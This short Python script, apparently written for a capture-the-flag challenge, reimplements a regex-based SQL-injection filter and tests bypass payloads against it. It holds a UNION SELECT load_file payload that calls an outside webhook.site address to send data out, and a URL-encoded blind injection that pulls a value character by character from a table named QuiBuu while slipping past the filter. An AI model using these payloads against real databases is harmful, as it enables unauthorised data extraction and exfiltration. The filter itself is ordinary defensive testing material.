import re
import urllib.parse
def waf_cuc_chill(ans):
    # idk, I thought too much of a good thing
    ans = urllib.parse.quote(ans)
    print(ans)
    pattern = re.compile(r'(and|0r|substring|subsrt|if|case|cast|like|>|<|(?:/\%2A.*?\%2A/)|\\|~|\+|-|when|then|order|name|url|;|--|into|limit|update|delete|drop|join|version|not|hex|load_extension|round|random|lower|replace|likely|iif|abs|char|unhex|unicode|trim|offset|count|upper|sqlite_version\(\)|#|true|false|max|\^|length|all|values|0x.*?|left|right|mid|%09|%0A|%20|\t)', re.IGNORECASE)
    
    if pattern.search(ans):
        print(pattern.search(ans))
        return True
    return False
# substr(url,1,1)='I
ans = "UNIONselect load_file(concat('\\\\','https://webhook.site/1a750059-e488-443d-8389-f439f5fc95a5'))"

B = "or%250Dsubstr%28%28select%250D%603%60%250Dfrom%250D%28select%250D1%2C2%2C3%250Dunion%250Dselect%250D%2A%250Dfrom%250DQuiBuu%29test%250Dwhere%250Dsubstr%28%603%60%2C1%2C2%29%3D%27IS%27%29%2C1%2C2%29%3D%27IS"
print(waf_cuc_chill(B))

